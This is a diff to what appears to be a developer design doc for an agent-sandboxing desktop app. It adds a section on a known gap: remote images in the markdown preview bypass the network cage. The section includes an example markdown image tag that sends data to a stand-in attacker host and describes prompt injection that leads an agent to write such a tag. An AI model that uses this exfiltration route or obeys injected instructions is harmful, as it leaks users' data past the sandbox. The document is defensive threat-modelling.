@@ -27,7 +27,41 @@ Four states, set per-workspace at create + editable later. `Enforce` is the full
 - **Default sets** baked into Rust (`builtin_rw_paths`/`builtin_deny_paths`, per-CLI `render_filter` in `sandbox.rs`). Project `sandbox_*` fields are extras only, seeded at workspace creation.
 - **Recent denies**: `workspace_recent_denials(id, minutes?)` shells to `log show` filtered to workspace path + "deny". Surfaced in sandbox dialog under lazy `<details>`.
 
+## Known gap: the webview is outside the cage
+
+The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
+**webview**, which makes its own network requests as the app itself. Anything
+the webview can be made to fetch is egress the proxy allowlist never sees.
+
+There is one such path today, accepted deliberately (#65): `img-src` in
+`tauri.conf.json` allows any `https:` origin, so the markdown preview renders
+remote images. Previewing
+
+```markdown
+![](https://attacker.example/x.png?d=<data>)
+```
+
+fires a GET to an arbitrary host on render, with no click and no prompt, even
+when the workspace is in `Enforce` and the agent itself cannot reach that host.
+
+The realistic trigger is not a scheming agent, it is **prompt injection plus
+untrusted markdown**. An agent reads a dependency's README, a GitHub issue, or a
+fetched page, and that text tells it to write the image tag. The same applies to
+markdown the agent never touched: a contributor's fork, a submodule, a vendored
+package. Only a GET is possible (no script: `script-src 'self'`, markdown-it runs
+with `html:false` and blocks `javascript:`), so the payload is limited to what
+the markdown's author can encode in a URL, plus the viewer's IP, user-agent, and
+timing. GitHub and VS Code make the same tradeoff for their previews.
+
+If this ever needs closing, the shape is a default-off "load remote images"
+preference gating hydration (tracked in #69), not a CSP tweak: Tauri's CSP is
+one policy for the whole webview and cannot be scoped to a component.
+
+**Before widening the CSP again, remember it is app-wide.** `connect-src` or
+`script-src` would be materially worse than `img-src` is.
+
 ## Do NOT
 
 - Sandbox AuxTerminal, setup, run, or archive scripts.
 - Expose `workspace_set_sandbox` without SIGKILLing live PTYs by default. `kill_live=false` is an explicit escape hatch with a warning — don't make it the default.
+- Widen `tauri.conf.json`'s CSP without reading "Known gap" above. It applies to the whole webview, not to the component you are working on.
